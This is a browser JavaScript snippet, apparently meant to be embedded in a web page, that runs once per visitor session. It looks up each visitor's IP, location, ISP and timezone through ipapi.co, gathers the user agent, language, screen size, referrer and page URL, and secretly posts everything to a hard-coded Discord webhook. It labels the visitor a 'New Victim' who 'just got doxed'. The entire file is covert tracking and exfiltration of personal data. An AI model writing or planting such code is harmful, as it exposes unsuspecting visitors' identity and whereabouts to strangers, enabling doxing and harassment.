if (!sessionStorage.getItem("visited")) {
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      const {
        ip, city, region, country_name, country_code, org, timezone
      } = data;

      const ua = navigator.userAgent;
      const lang = navigator.language;
      const screenSize = `${screen.width}x${screen.height}`;
      const ref = document.referrer || "None";

      fetch("https://discord.com/api/webhooks/1386745630906384435/7h5ldp3xvDvMnoYCAPzWsoo8YM8Xg1EOeqmBqGxfDxN_l6mXLWnCBlwO1R4qoFTfkbNN", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: " New Victim!",
            description: "**Someone just got doxed LOL ak47.bio**",
            color: 0x000000,
            fields: [
              { name: "📍 Location", value: `${city}, ${region}, ${country_name} (${country_code})`, inline: false },
              { name: "🌐 IP", value: ip, inline: true },
              { name: "🏢 ISP", value: org, inline: true },
              { name: "🕓 Timezone", value: timezone, inline: true },
              { name: "💻 User-Agent", value: ua, inline: false },
              { name: "🗣️ Language", value: lang, inline: true },
              { name: "🖥️ Screen", value: screenSize, inline: true },
              { name: "↩️ Referrer", value: ref, inline: false },
              { name: "📄 Page", value: window.location.href, inline: false }
            ],
            footer: { text: "ak47 Network" },
            timestamp: new Date().toISOString()
          }]
        })
      });

      sessionStorage.setItem("visited", "true");
    });
}
